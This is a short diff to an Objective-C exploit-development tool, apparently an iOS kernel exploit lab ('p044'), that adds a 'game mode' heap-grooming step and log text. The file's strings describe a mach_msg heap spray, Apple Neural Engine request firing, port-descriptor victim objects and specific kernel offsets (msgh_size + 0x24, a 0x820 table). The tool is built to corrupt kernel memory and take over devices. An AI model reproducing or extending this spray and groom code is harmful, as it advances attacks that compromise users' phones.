@@ -158,7 +158,7 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v73-820spray"
+#define P044_BUILD @"p044-v73-820spray-gm"
 
 #define INPUT_COUNT 191
 /* v73: P034 class. kdata = msgh_size + 0x24. ANE table view is 0x820.
@@ -2223,6 +2223,9 @@ static void *watch_worker(void *arg) {
     NSMutableString *out = [NSMutableString string];
     [out appendFormat:@"=== p044 session %@ BUILD %@ ===\n",
         LabLocalMilitaryNow(), P044_BUILD];
+    [LabDeviceProfile beginHuntGroom];
+    [out appendString:[LabDeviceProfile gameModeLine]];
+    [out appendString:@"GAME_MODE groom: LSSupports+GCSupports+category=games. Quiets CoreML/Photos/Siri 0x820 noise, IOGPU exclusivity, jetsam shield, notification deferral. Same 0x820 primitive. Do not remaining-fire 254. Occupancy stays occupancy until a live 0x820 neighbor converts.\n"];
     [out appendString:@"CoreML staging + mach_msg spray + _ANEClient request fire.\n"];
     [out appendString:@"Uses bundled model/ MIL dir (addchain-191: on-device ANECCompile in PHASE 3b) or override .mlmodelc + _ANERequest built from OUR surfaces.\n"];
     [out appendFormat:@"v49 desc-tile: same _ANEClient fire; TAIL 8 port-kind victims carry 8 port descs (descs 3..8 sit in the ANE record tile at body+0x1c..0x64); non-tail port-kind = 2-desc v48.1 control. NEON=%u PORT_VICTIM_EVERY=%u HOLE_MODE=%d.\n",
